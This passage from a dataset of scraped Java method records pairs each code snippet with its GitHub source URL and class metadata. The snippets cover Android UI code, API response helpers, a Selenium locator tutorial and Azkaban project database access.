"https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/MessageDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetContentView(R.layout.gift_cards);\t\ttextviewCount=(TextView)findViewById(R.id.gift_card_reward_pts);\t\ttextviewCount.setText(\"Available Reward Points :\"+rewardPoints);\t\tgiftCardsPojosArrayList=new ArrayList<GiftCardsPojo>();\t\tlinearLayoutGiftCard = (LinearLayout)findViewById(R.id.linlay_giftcard_sublayout);\t\tinflaterLayout = LayoutInflater.from(getBaseContext());\t\tGiftCardasyntask giftCardasyntask=new GiftCardasyntask();\t\tgiftCardasyntask.execute();\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/expandablelistview/src/com/example/expandablelistview/GiftCards.java", "stars": "74", "class": {"name": "GiftCards", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getGiftCardConatainerLayout", "params": ["LinearLayout", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void getGiftCardConatainerLayout(LinearLayout container,int numberofitems) {\t\t\t mainGiftCard=(LinearLayout)findViewById(R.id.linlay_giftcards_main);\t\t\tint count = -1;\t\t\tif (giftCardsPojosArrayList != null && giftCardsPojosArrayList.size() > 0) {\t\t\tfor (GiftCardsPojo item : giftCardsPojosArrayList) {\t\t\t\tcount++;\t\t\t\tif (count >= numberofitems)\t\t\t\t\tbreak;\t\t\t\t\t\t\t\tgetItemView(R.layout.gift_card_item,mainGiftCard, 1,item);\t\t\t}\t\t\tcontainer.removeAllViews();\t\t\tcontainer.addView(mainGiftCard);\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/expandablelistview/src/com/example/expandablelistview/GiftCards.java", "stars": "74", "class": {"name": "GiftCards", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemView", "params": ["int", "LinearLayout", "int", "GiftCardsPojo"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void getItemView(int giftCardItemLayout,LinearLayout container,final int position,final GiftCardsPojo item)\t{\t\t// TODO Auto-generated method stub\t\tView giftCardItem = (View)inflaterLayout.inflate(giftCardItemLayout, null, false);\t\tTextView giftCardPoints = (TextView)giftCardItem.findViewById(R.id.gift_card_points);\t\tgiftCardPoints.setText(item.cardPoints+\"\");\t\tImageView gift_card_image = (ImageView)giftCardItem.findViewById(R.id.gift_card_image);\t\tgift_card_image.setImageResource(item.cardImage);\t\tImageView buttonPlus=(ImageView)giftCardItem.findViewById(R.id.button_plus);\t\tImageView  buttonMinus=(ImageView)giftCardItem.findViewById(R.id.button_minus);\t\tfinal EditText editTextcountItem=(EditText)giftCardItem.findViewById(R.id.countitem);\t\tfinal CheckBox checkboxSelection=(CheckBox)giftCardItem.findViewById(R.id.checkboxcount);\t\ttextviewCount=(TextView)findViewById(R.id.gift_card_reward_pts);\t\ttextviewCount.setText(\"Available Reward Points :\"+rewardPoints);\t\teditTextcountItem.setTag(0);\t\tbuttonPlus.setOnClickListener(new OnClickListener() {\t\t\t@Override\t\t\tpublic void onClick(View arg0) {\t\t\t\t// TODO Auto-generated method stub\t\t\t\tInteger counter = (Integer) editTextcountItem.getTag();\t\t\t\tif(rewardPoints>=item.cardPoints)\t\t\t\t{\t\t\t\t\tcounter++;\t\t\t\t\teditTextcountItem.setText(counter+\"\");\t\t\t\t\teditTextcountItem.setTag(counter);\t\t\t\t\trewardPoints=rewardPoints-item.cardPoints;\t\t\t\t\ttextviewCount.setText(\"Available Reward Points :\"+rewardPoints);\t\t\t\t\tif(counter!=0)\t\t\t\t\t\tcheckboxSelection.setChecked(true);\t\t\t\t}else{\t\t\t\t\tToast.makeText(getBaseContext(), \"You do not have sufficient reward point\", Toast.LENGTH_SHORT).show();\t\t\t\t\treturn;\t\t\t\t}\t\t\t}\t\t});\t\tbuttonMinus.setOnClickListener(new OnClickListener() {\t\t\t@Override\t\t\tpublic void onClick(View v) {\t\t\t\t// TODO Auto-generated method stub\t\t\t\tInteger counter = (Integer) editTextcountItem.getTag();\t\t\t\tcheckboxSelection.getTag();\t\t\t\tif(counter>0)\t\t\t\t{\t\t\t\t\tcounter--;\t\t\t\t\teditTextcountItem.setText(counter+\"\");\t\t\t\t\teditTextcountItem.setTag(counter);\t\t\t\t\trewardPoints=rewardPoints+item.cardPoints;\t\t\t\t\ttextviewCount.setText(\"Available Reward Points :\"+rewardPoints);\t\t\t\t\tif(counter==0)\t\t\t\t\t\tcheckboxSelection.setChecked(false);\t\t\t\t}else{\t\t\t\t\tToast.makeText(getBaseContext(), \"You do not have sufficient reward point\", Toast.LENGTH_SHORT).show();\t\t\t\t\treturn;\t\t\t\t}\t\t\t}\t\t});\t\t\t\tcontainer.addView(giftCardItem);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/expandablelistview/src/com/example/expandablelistview/GiftCards.java", "stars": "74", "class": {"name": "GiftCards", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPreExecute", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\t\tprotected void onPreExecute() {\t\t\t// TODO Auto-generated method stub\t\t\tsuper.onPreExecute();\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/expandablelistview/src/com/example/expandablelistview/GiftCards.java", "stars": "74", "class": {"name": "GiftCardasyntask", "extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"method_name": "doInBackground", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "\t\tprotected String doInBackground(String... params) {\t\t\t\t\tGiftCardsPojo giftCardsPojo=new GiftCardsPojo();\t\t\tgiftCardsPojosArrayList=giftCardsPojo.getAppData();\t\t\treturn null;\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/expandablelistview/src/com/example/expandablelistview/GiftCards.java", "stars": "74", "class": {"name": "GiftCardasyntask", "extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"method_name": "onPostExecute", "params": ["Object"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\t\tprotected void onPostExecute(Object result) {\t\t\t\t\tgetGiftCardConatainerLayout(linearLayoutGiftCard, 5);\t\t\tgetGiftCardConatainerLayout(linearLayoutGiftCard, 5);\t\t\tsuper.onPostExecute(result);\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/expandablelistview/src/com/example/expandablelistview/GiftCards.java", "stars": "74", "class": {"name": "GiftCardasyntask", "extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"method_name": "executeInternal", "params": ["JobExecutionContext"], "throws": ["JobExecutionException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void executeInternal(JobExecutionContext context)            throws JobExecutionException {        // load jobId        JobKey jobKey = context.getTrigger().getJobKey();        Long jobId = Long.valueOf(jobKey.getName());        // trigger        TaskUtil.produceTask(jobId);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/scheduler/cluster/bean/TaskProduceBean.java", "stars": "23", "class": {"name": "TaskProduceBean", "extends": "QuartzJobBean", "implements": null, "modifiers": ["public"]}}, {"method_name": "createIntent", "params": ["Context", "Account", "String", "Bundle"], "throws": null, "modifiers": ["static"], "return_type": "Intent", "snippet": "    static Intent createIntent(Context context, Account account, String authority, Bundle extras) {        Intent intent = new Intent(context, PeriodicSyncReceiver.class);        intent.putExtra(KEY_ACCOUNT_NAME, account.name);        intent.putExtra(KEY_ACCOUNT_TYPE, account.type);        intent.putExtra(KEY_AUTHORITY, authority);        intent.putExtra(KEY_USERDATA, extras);        return intent;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/PeriodicSyncReceiver.java", "stars": "74", "class": {"name": "PeriodicSyncReceiver", "extends": "BroadcastReceiver", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "createPendingIntent", "params": ["Context", "Account", "String", "Bundle"], "throws": null, "modifiers": ["static"], "return_type": "PendingIntent", "snippet": "    static PendingIntent createPendingIntent(Context context, Account account, String authority,            Bundle extras) {        int requestCode = 0;        Intent intent = createIntent(context, account, authority, extras);        int flags = 0;        return PendingIntent.getBroadcast(context, requestCode, intent, flags);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/PeriodicSyncReceiver.java", "stars": "74", "class": {"name": "PeriodicSyncReceiver", "extends": "BroadcastReceiver", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onReceive", "params": ["Context", "Intent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onReceive(Context context, Intent intent) {        String accountName = intent.getStringExtra(KEY_ACCOUNT_NAME);        String accountType = intent.getStringExtra(KEY_ACCOUNT_TYPE);        String authority = intent.getStringExtra(KEY_AUTHORITY);        Bundle extras = intent.getBundleExtra(KEY_USERDATA);        Account account = new Account(accountName, accountType);        ContentSyncer syncer = ContentSyncer.get(context);        if (syncer.getSyncAutomatically(account, authority)) {            syncer.requestSync(account, authority, extras);        } else {            syncer.removePeriodicSync(account, authority, extras);        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/PeriodicSyncReceiver.java", "stars": "74", "class": {"name": "PeriodicSyncReceiver", "extends": "BroadcastReceiver", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "filtra", "params": ["TentativaPagamento"], "throws": null, "modifiers": ["public"], "return_type": "TreeSet<Pagador>", "snippet": "\tpublic TreeSet<Pagador> filtra(TentativaPagamento tentativaPagamento){\t\tAssert.notNull(tentativaPagamento, \"A tentativa de pagamento n\u00e3o pode ser nula\");\t\t\t\tTreeSet<Pagador> pagadores = processadores.stream()\t\t\t\t.map(processador -> processador.aceita(tentativaPagamento))\t\t\t\t.filter(Optional :: isPresent)\t\t\t\t.map(Optional :: get)\t\t\t\t.collect(Collectors.toCollection(() -> new TreeSet<>()));\t\t\t\tAssert.isTrue(!pagadores.isEmpty(),\t\t\t\t\"Precisa existir pelo menos um objeto do tipo Pagador dispon\u00edvel para realizar o pagamento. #bug\");\t\t\t\t\treturn pagadores;\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/PagadoresOrdenadosPeloMenorCusto.java", "stars": "9", "class": {"name": "PagadoresOrdenadosPeloMenorCusto", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "success", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "APIResponse", "snippet": "    public static APIResponse success(){        return new APIResponse(CODE_SUCCESS);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "success", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "APIResponse", "snippet": "    public static APIResponse success(Object data){        return new APIResponse(CODE_SUCCESS, data);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fail", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "APIResponse", "snippet": "    public static APIResponse fail(String msg){        return new APIResponse(CODE_FAIL, msg);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "widthCode", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "APIResponse", "snippet": "    public static APIResponse widthCode(String errorCode) {        return new APIResponse(errorCode);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMsg", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsg() {        return msg;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMsg", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsg(String msg) {        this.msg = msg;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCode() {        return code;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(String code) {        this.code = code;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T getData() {        return data;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setData", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(T data) {        this.data = data;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/APIResponse.java", "stars": "2", "class": {"name": "APIResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onLoadCanceled", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLoadCanceled (android.support.v4.content.Loader p0)\t{\t\tn_onLoadCanceled (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/content/Loader_OnLoadCanceledListenerImplementor.java", "stars": "2", "class": {"name": "Loader_OnLoadCanceledListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onLoadCanceled", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onLoadCanceled (android.support.v4.content.Loader p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/content/Loader_OnLoadCanceledListenerImplementor.java", "stars": "2", "class": {"name": "Loader_OnLoadCanceledListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/content/Loader_OnLoadCanceledListenerImplementor.java", "stars": "2", "class": {"name": "Loader_OnLoadCanceledListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/content/Loader_OnLoadCanceledListenerImplementor.java", "stars": "2", "class": {"name": "Loader_OnLoadCanceledListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException {\t\t\t\t// Set the property of Chrome Driver\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"drivers/chromedriver.exe\");\t\t\t\t//Instantiate an instance of ChromeDriver\t\tWebDriver driver=new ChromeDriver();\t\t\t\t// navigating the desired URL\t\tString url=\"https://opensource-demo.orangehrmlive.com/index.php/auth/login\";\t\t\t\tdriver.get(url);\t\t\t\t//Locators\t\t\t\t//1. id (1st preference)\t\t\t//\tdriver.findElement(By.id(\"txtUsername\")).sendKeys(\"Admin\");\t\t\t\t//2. name\t\t//\t\tWebElement password= driver.findElement(By.name(\"txtPassword\"));//\t\tpassword.sendKeys(\"admin123\");\t\t\t\t//3. className\t\t//\t\tdriver.findElement(By.className(\"button\")).click();\t\t\t\t//4.linkText (only for links)\t\t//\t\tThread.sleep(3000);//\t\tdriver.findElement(By.linkText(\"Welcome Admin\")).click();//\t\tThread.sleep(5000);//\t\tdriver.findElement(By.linkText(\"Logout\")).click();\t\t\t\t//5. PartialLinkText\t\t//\t\tThread.sleep(3000);//\t\tdriver.findElement(By.partialLinkText(\"Welcome\")).click();//\t\tThread.sleep(5000);//\t\tdriver.findElement(By.linkText(\"Logout\")).click();\t\t\t\t// 6. tagName\t\t\t\t// 7. XPath\t\t\t\t//a. Absolute XPath(Native) \"/\" slash ile baslar\t\tdriver.findElement(By.xpath(\"/html/body/div[1]/div/div[3]/div[2]/div[2]/form/div[2]/input\")).sendKeys(\"Admin\");\t\t\t\t//b. Relative XPath  \"//\" slashes ile baslar\t\tdriver.findElement(By.xpath(\"//input[@name='txtPassword']\")).sendKeys(\"admin123\");\t\t\t\t//8. cssSelector\t\tdriver.findElement(By.cssSelector(\"input[class='button']\")).click(); //input.button\t\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class2/Locators.java", "stars": "3", "class": {"name": "Locators", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testListern", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testListern(GroupMsg msg, MsgSender sender) {        //System.out.println(sender.SETTER.setGroupBan(msg.getGroupCode(), msg.getQQCode(), 1));//        CQCodeUtil cqCodeUtil = CQCodeUtil.build();//        List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);//        for (String s:strings){//            System.out.println(s);//        }        sender.SENDER.sendPrivateMsg(msg.getQQCode(), msg.getMsg());    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/testListen.java", "stars": "2", "class": {"name": "testListen", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fetchAllActiveProjects", "params": [], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "List<Project>", "snippet": "  public List<Project> fetchAllActiveProjects() throws ProjectManagerException {    final ProjectResultHandler handler = new ProjectResultHandler();    List<Project> projects = null;    try {//      projects = this.dbOperator.query(ProjectResultHandler.SELECT_ALL_ACTIVE_PROJECTS, handler);      String serchSQL = ProjectResultHandler.SELECT_ALL_ACTIVE_PROJECTS;      serchSQL = serchSQL + \" ORDER BY name\";      projects = this.dbOperator.query(serchSQL, handler);      projects.forEach(project -> {//        for (final Triple<String, Boolean, Permission> perm : fetchPermissionsForProject(project)) {//          setProjectPermission(project, perm);//        }fetchAllPermissionsForProject        for (final ProjectPermission projectPermission : fetchAllPermissionsForProject(project)) {          setProjectAllPermission(project, projectPermission);        }      });    } catch (final SQLException ex) {      logger.error(ProjectResultHandler.SELECT_PROJECT_BY_ID + \" failed.\", ex);      throw new ProjectManagerException(\"Error retrieving all projects\", ex);    }    return projects;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "setProjectPermission", "params": ["Project", "Triple<String,Boolean,Permission>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setProjectPermission(final Project project,      final Triple<String, Boolean, Permission> perm) {    if (perm.getSecond()) {      project.setGroupPermission(perm.getFirst(), perm.getThird());    } else {      project.setUserPermission(perm.getFirst(), perm.getThird());    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchProjectById", "params": ["int"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "Project", "snippet": "  public Project fetchProjectById(final int id) throws ProjectManagerException {    Project project = null;    final ProjectResultHandler handler = new ProjectResultHandler();    try {      final List<Project> projects = this.dbOperator          .query(ProjectResultHandler.SELECT_PROJECT_BY_ID, handler, id);      if (projects.isEmpty()) {        throw new ProjectManagerException(\"No project with id \" + id + \" exists in db.\");      }      project = projects.get(0);      // Fetch the user permissions      for (final Triple<String, Boolean, Permission> perm : fetchPermissionsForProject(project)) {        // TODO kunkun-tang: understand why we need to check permission not equal to 0 here.        if (perm.getThird().toFlags() != 0) {          setProjectPermission(project, perm);        }      }    } catch (final SQLException ex) {      logger.error(ProjectResultHandler.SELECT_PROJECT_BY_ID + \" failed.\", ex);      throw new ProjectManagerException(\"Query for existing project failed. Project \" + id, ex);    }    return project;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchProjectByName", "params": ["String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "Project", "snippet": "  public Project fetchProjectByName(final String name) throws ProjectManagerException {    Project project = null;    final ProjectResultHandler handler = new ProjectResultHandler();    // select active project from db first, if not exist, select inactive one.    // At most one active project with the same name exists in db.    try {      List<Project> projects = this.dbOperator          .query(ProjectResultHandler.SELECT_ACTIVE_PROJECT_BY_NAME, handler, name);      if (projects.isEmpty()) {        projects = this.dbOperator            .query(ProjectResultHandler.SELECT_PROJECT_BY_NAME, handler, name);        if (projects.isEmpty()) {          throw new ProjectManagerException(\"No project with name \" + name + \" exists in db.\");        }      }      project = projects.get(0);      for (final Triple<String, Boolean, Permission> perm : fetchPermissionsForProject(project)) {        if (perm.getThird().toFlags() != 0) {          setProjectPermission(project, perm);        }      }    } catch (final SQLException ex) {      logger.error(ProjectResultHandler.SELECT_ACTIVE_PROJECT_BY_NAME + \" failed.\", ex);      throw new ProjectManagerException(          ProjectResultHandler.SELECT_ACTIVE_PROJECT_BY_NAME + \" failed.\", ex);    }    return project;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchPermissionsForProject", "params": ["Project"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "List<Triple>", "snippet": "  private List<Triple<String, Boolean, Permission>> fetchPermissionsForProject(      final Project project)      throws ProjectManagerException {    final ProjectPermissionsResultHandler permHander = new ProjectPermissionsResultHandler();    List<Triple<String, Boolean, Permission>> permissions = null;    try {      permissions = this.dbOperator.query(ProjectPermissionsResultHandler.SELECT_PROJECT_PERMISSION, permHander, project.getId());    } catch (final SQLException ex) {      logger.error(ProjectPermissionsResultHandler.SELECT_PROJECT_PERMISSION + \" failed.\", ex);      throw new ProjectManagerException(\"Query for permissions for \" + project.getName() + \" failed.\", ex);    }    return permissions;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "createNewProject", "params": ["String", "String", "User"], "throws": ["ProjectManagerException"], "modifiers": ["synchronized", "public"], "return_type": "Project", "snippet": "  public synchronized Project createNewProject(final String name, final String description,      final User creator)      throws ProjectManagerException {    final ProjectResultHandler handler = new ProjectResultHandler();    // Check if the same project name exists.    try {      final List<Project> projects = this.dbOperator          .query(ProjectResultHandler.SELECT_ACTIVE_PROJECT_BY_NAME, handler, name);      if (!projects.isEmpty()) {        throw new ProjectManagerException(            \"Active project with name \" + name + \" already exists in db.\");      }    } catch (final SQLException ex) {      logger.error(ex);      throw new ProjectManagerException(\"Checking for existing project failed. \" + name, ex);    }    final String INSERT_PROJECT =        \"INSERT INTO projects ( name, active, modified_time, create_time, version, last_modified_by, \"            + \"description, create_user, enc_type, settings_blob) values (?,?,?,?,?,?,?,?,?,?)\";    final SQLTransaction<Integer> insertProject = transOperator -> {      final long time = System.currentTimeMillis();      return transOperator          .update(INSERT_PROJECT, name, true, time, time, null, creator.getUserId(), description,              creator.getUserId(), this.defaultEncodingType.getNumVal(), null);    };    // Insert project    try {      final int numRowsInserted = this.dbOperator.transaction(insertProject);      if (numRowsInserted == 0) {        throw new ProjectManagerException(\"No projects have been inserted.\");      }    } catch (final SQLException ex) {      logger.error(INSERT_PROJECT + \" failed.\", ex);      throw new ProjectManagerException(\"Insert project\" + name + \" for existing project failed. \",          ex);    }    return fetchProjectByName(name);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadProjectFile", "params": ["int", "int", "File", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadProjectFile(final int projectId, final int version, final File localFile,      final String uploader)      throws ProjectManagerException {    /*     * The below transaction uses one connection to do all operations. Ideally, we should commit     * after the transaction completes. However, uploadFile needs to commit every time when we     * upload any single chunk.     *     * Todo kunkun-tang: fix the transaction issue.     */    final SQLTransaction<Integer> uploadProjectFileTransaction = transOperator -> {      /* Step 1: Update DB with new project info */      addProjectToProjectVersions(transOperator, projectId, version, localFile, uploader,          computeHash(localFile), null);      transOperator.getConnection().commit();      /* Step 2: Upload File in chunks to DB */      final int chunks = uploadFileInChunks(transOperator, projectId, version, localFile);      /* Step 3: Update number of chunks in DB */      updateChunksInProjectVersions(transOperator, projectId, version, chunks);      return 1;    };    uploadProjectFile(projectId, localFile, uploadProjectFileTransaction);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadProjectFile", "params": ["int", "int", "File", "String", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadProjectFile(final int projectId, final int version, final File localFile,      final String uploader, String resourceID)      throws ProjectManagerException {    /*     * The below transaction uses one connection to do all operations. Ideally, we should commit     * after the transaction completes. However, uploadFile needs to commit every time when we     * upload any single chunk.     *     * Todo kunkun-tang: fix the transaction issue.     */    final SQLTransaction<Integer> uploadProjectFileTransaction = transOperator -> {      /* Step 1: Update DB with new project info */      addProjectToProjectVersions(transOperator, projectId, version, localFile, uploader,          computeHash(localFile), resourceID);      transOperator.getConnection().commit();      /* Step 2: Upload File in chunks to DB */      final int chunks = uploadFileInChunks(transOperator, projectId, version, localFile);      /* Step 3: Update number of chunks in DB */      updateChunksInProjectVersions(transOperator, projectId, version, chunks);      return 1;    };    uploadProjectFile(projectId, localFile, uploadProjectFileTransaction);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadProjectFile", "params": ["int", "File", "SQLTransaction<Integer>"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void uploadProjectFile(final int projectId, final File localFile, SQLTransaction<Integer> uploadProjectFileTransaction)      throws ProjectManagerException {    final long startMs = System.currentTimeMillis();    logger.info(String        .format(\"Uploading Project ID: %d file: %s [%d bytes]\", projectId, localFile.getName(),            localFile.length()));    try {      this.dbOperator.transaction(uploadProjectFileTransaction);    } catch (final SQLException e) {      logger.error(\"upload project files failed.\", e);      throw new ProjectManagerException(\"upload project files 